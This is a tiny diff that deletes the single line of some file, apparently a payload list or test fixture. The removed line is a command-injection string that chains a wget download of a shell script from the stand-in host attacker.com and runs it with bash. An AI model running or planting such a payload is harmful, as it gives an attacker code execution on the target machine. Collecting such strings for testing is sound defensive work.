@@ -1,1 +1,0 @@
-; wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh
